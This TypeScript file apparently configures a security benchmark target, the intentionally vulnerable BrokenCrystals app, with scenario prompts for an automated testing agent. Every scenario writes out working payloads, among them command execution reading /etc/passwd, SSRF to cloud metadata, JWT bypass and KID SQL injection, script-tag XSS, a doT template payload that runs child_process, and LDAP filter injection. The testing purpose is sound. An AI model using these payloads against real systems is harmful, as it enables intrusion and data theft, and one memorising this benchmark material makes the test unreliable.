import type { BenchmarkTarget } from "./types";

/**
 * BrokenCrystals Benchmark Target
 *
 * BrokenCrystals is a vulnerable application by Bright Security (NeuraLegion)
 * featuring intentional security flaws across REST, GraphQL, and gRPC APIs.
 * Built on NestJS + React + PostgreSQL.
 *
 * Default credentials: admin / admin
 * Docker Compose: docker compose --file=compose.local.yml up -d
 * Ports: 3000 (HTTP/API), 5000 (gRPC), 8080 (Keycloak)
 *
 * @see https://github.com/NeuraLegion/brokencrystals
 */

const brokenCrystals: BenchmarkTarget = {
  name: "broken-crystals",
  displayName: "BrokenCrystals",
  version: "latest",
  dockerImage: "brightsec/brokencrystals:latest",
  port: 3000,
  healthCheck: "/api/config",
  expectedVulns: [
    { name: "SQL Injection", keywords: ["sqli", "sql injection", "sql", "injection"] },
    { name: "Cross-Site Scripting (XSS)", keywords: ["xss", "cross-site scripting", "script injection", "reflected xss", "stored xss", "dom xss"] },
    { name: "Authentication Bypass", keywords: ["auth", "authentication", "bypass", "login", "jwt", "token", "auth_bypass", "authentication bypass"] },
    { name: "SSRF", keywords: ["ssrf", "server-side request forgery", "request forgery"] },
    { name: "Path Traversal / LFI", keywords: ["path traversal", "directory traversal", "lfi", "file inclusion", "local file inclusion", "../", "path_traversal"] },
    { name: "Command Injection", keywords: ["command injection", "os command", "rce", "remote code", "command_injection"] },
    { name: "SSTI", keywords: ["ssti", "server-side template injection", "template injection"] },
    { name: "LDAP Injection", keywords: ["ldap", "ldap injection"] },
    { name: "Security Misconfiguration", keywords: ["misconfiguration", "header", "cors", "csp", "security header", "cookie", "csrf"] },
    { name: "Sensitive Data Exposure", keywords: ["sensitive data", "information disclosure", "exposure", "leak", "config", "secrets"] },
    { name: "Mass Assignment", keywords: ["mass assignment", "parameter pollution", "hidden field", "isAdmin"] },
    { name: "File Upload", keywords: ["file upload", "unrestricted upload", "avatar", "upload"] },
  ],
  scenarios: [
    // ── 1. OS Command Injection via /api/spawn ────────────────────────
    {
      id: "bc-cmdi-spawn",
      name: "OS Command Injection via Spawn Endpoint",
      exposureType: "cve_exploitation",
      description: (targetUrl) =>
        `Target: ${targetUrl}\n` +
        `BrokenCrystals NestJS application with DIRECT command execution.\n` +
        `GET ${targetUrl}/api/spawn?command=id — the 'command' query parameter value is passed directly to child_process.spawn().\n` +
        `This is NOT injection into an existing command — the entire parameter IS the command.\n` +
        `Use test_payloads with parameter="command", parameter_location="query", vuln_categories=["cmdi"], method="GET" on ${targetUrl}/api/spawn.\n` +
        `Or use validate_vulnerability with url="${targetUrl}/api/spawn", method="GET", parameter_name="command", parameter_location="url_param".\n` +
        `Working examples: ?command=id returns "uid=...", ?command=whoami returns "node", ?command=cat /etc/passwd returns passwd file.\n` +
        `Also check GET /api/config for information disclosure (leaks DB connection strings and API keys).`,
      targetEndpoints: ["/api/spawn"],
      expectedVulnTypes: ["command_injection"],
    },

    // ── 2. SSRF via /api/file ─────────────────────────────────────────
    {
      id: "bc-ssrf-file",
      name: "SSRF via File Retrieval Endpoint",
      exposureType: "cve_exploitation",
      description: (targetUrl) =>
        `Target: ${targetUrl}\n` +
        `BrokenCrystals has SSRF via the file retrieval endpoints.\n` +
        `GET ${targetUrl}/api/file?path=<url> and GET ${targetUrl}/api/file/raw?path=<url>\n` +
        `The 'path' parameter supports HTTP URLs and can be used to access:\n` +
        `- Cloud metadata: http://169.254.169.254/latest/meta-data/\n` +
        `- Internal services: http://localhost:5432, http://localhost:8080\n` +
        `- Arbitrary internal hosts\n` +
        `Also test for Local File Inclusion by passing local file paths like /etc/passwd.\n` +
        `Known endpoints:\n` +
        `- GET /api/file?path= (SSRF + LFI)\n` +
        `- GET /api/file/raw?path= (SSRF + LFI, raw content)\n` +
        `- GET /api/files (directory listing of server files)`,
      targetEndpoints: ["/api/file?path=http://localhost", "/api/file/raw?path=/etc/passwd"],
      expectedVulnTypes: ["ssrf", "path_traversal"],
    },

    // ── 3. JWT Authentication Bypass ──────────────────────────────────
    {
      id: "bc-jwt-bypass",
      name: "JWT Authentication Bypass",
      exposureType: "cve_exploitation",
      description: (targetUrl) =>
        `Target: ${targetUrl}\n` +
        `BrokenCrystals uses JWT for authentication with multiple known bypass vectors.\n` +
        `Step 1: Get a valid JWT. POST ${targetUrl}/api/auth/login with Content-Type: application/json\n` +
        `  Body: { "user": "admin", "password": "admin", "op": "basic" }\n` +
        `  This returns a JWT token. Default credentials vary per user: try admin/admin.\n` +
        `Step 2: Test JWT weaknesses via specialized login endpoints:\n` +
        `  - POST /api/auth/jwt/weak-key/login (uses weak secret "123")\n` +
        `  - POST /api/auth/jwt/kid-sql/login (KID SQL injection: kid: "' UNION SELECT 'key'--")\n` +
        `  - POST /api/auth/jwt/jku/login (JKU injection)\n` +
        `  - POST /api/auth/jwt/hmac/login (RS256→HS256 algorithm confusion)\n` +
        `Step 3: Test mass assignment: POST /api/users/basic with { "email": "x@x.com", "password": "x", "isAdmin": true }\n` +
        `Use http_fingerprint first to discover endpoints, then validate_vulnerability on /api/auth/login.\n` +
        `Use send_http_request to POST login and check if token is returned.`,
      targetEndpoints: ["/api/auth/login", "/api/users/basic"],
      expectedVulnTypes: ["auth_bypass"],
    },

    // ── 4. XSS (Reflected, Stored, DOM-based) ────────────────────────
    {
      id: "bc-xss-multi",
      name: "Multi-Vector XSS (Reflected + Stored + DOM)",
      exposureType: "cve_exploitation",
      description: (targetUrl) =>
        `Target: ${targetUrl}\n` +
        `BrokenCrystals has multiple XSS vulnerabilities.\n` +
        `1. REFLECTED XSS: GET ${targetUrl}/api/testimonials/count?query=<script>alert(1)</script>\n` +
        `   The 'query' parameter is reflected without encoding in the response body.\n` +
        `   Use validate_vulnerability with url="${targetUrl}/api/testimonials/count", method="GET", parameter_name="query", parameter_location="url_param", vulnerability_types=["xss"].\n` +
        `2. STORED XSS: POST ${targetUrl}/api/testimonials with { "name": "test", "title": "test", "message": "<script>alert(1)</script>" }\n` +
        `   Verify storage with: GET ${targetUrl}/api/testimonials\n` +
        `3. DOM XSS: GET ${targetUrl}/?maptitle=<script>alert(1)</script>\n` +
        `   Also try: GET ${targetUrl}/?__dummy=<img src=x onerror=alert(1)>\n` +
        `Test reflected XSS on /api/testimonials/count first — it is the most reliable.`,
      targetEndpoints: ["/api/testimonials/count", "/api/testimonials"],
      expectedVulnTypes: ["xss"],
    },

    // ── 5. SSTI via /api/render ───────────────────────────────────────
    {
      id: "bc-ssti-render",
      name: "Server-Side Template Injection via Render",
      exposureType: "cve_exploitation",
      description: (targetUrl) =>
        `Target: ${targetUrl}\n` +
        `BrokenCrystals uses the doT template engine for server-side rendering.\n` +
        `POST ${targetUrl}/api/render with Content-Type: text/plain body.\n` +
        `The ENTIRE request body is the template — NOT a named parameter.\n` +
        `Use test_payloads with parameter="template", parameter_location="raw_body", vuln_categories=["ssti"], method="POST" on ${targetUrl}/api/render.\n` +
        `Or use send_http_request with POST ${targetUrl}/api/render, header Content-Type: text/plain, body "{{= 7*7 }}".\n` +
        `Working payloads:\n` +
        `- Body: "{{= 7*7 }}" → returns "49" (SSTI confirmed)\n` +
        `- Body: "{{= process.env }}" → returns env vars (info disclosure)\n` +
        `- Body: "{{= global.process.mainModule.require('child_process').execSync('id').toString() }}" → returns uid (RCE)\n` +
        `Also check GET /api/config (leaks DB credentials and API keys).`,
      targetEndpoints: ["/api/render", "/api/config"],
      expectedVulnTypes: ["ssti", "command_injection"],
    },

    // ── 6. LDAP Injection + Information Disclosure ────────────────────
    {
      id: "bc-ldap-info",
      name: "LDAP Injection and Sensitive Data Exposure",
      exposureType: "cve_exploitation",
      description: (targetUrl) =>
        `Target: ${targetUrl}\n` +
        `BrokenCrystals has LDAP injection and information disclosure vulnerabilities.\n` +
        `1. LDAP INJECTION: GET ${targetUrl}/api/users/ldap?query=<ldap_filter>\n` +
        `   The query parameter is passed to an LDAP search without sanitization.\n` +
        `   Test payloads: *, )(|(uid=*), )(|(password=*)\n` +
        `2. SENSITIVE DATA EXPOSURE:\n` +
        `   - GET /api/config — leaks database connection strings and API keys\n` +
        `   - GET /api/secrets — exposes secret tokens\n` +
        `   - GET /.htaccess — common file exposure\n` +
        `   - GET /nginx.conf — server configuration leak\n` +
        `3. SECURITY MISCONFIGURATIONS:\n` +
        `   - CORS: Access-Control-Allow-Origin: * (wildcard)\n` +
        `   - Missing CSRF tokens on state-changing requests\n` +
        `   - Cookies without Secure/HttpOnly flags\n` +
        `   - Missing security headers (CSP, HSTS, X-Frame-Options)`,
      targetEndpoints: ["/api/users/ldap", "/api/config", "/api/secrets"],
      expectedVulnTypes: ["ldap", "misconfiguration"],
    },
  ],
};

export default brokenCrystals;
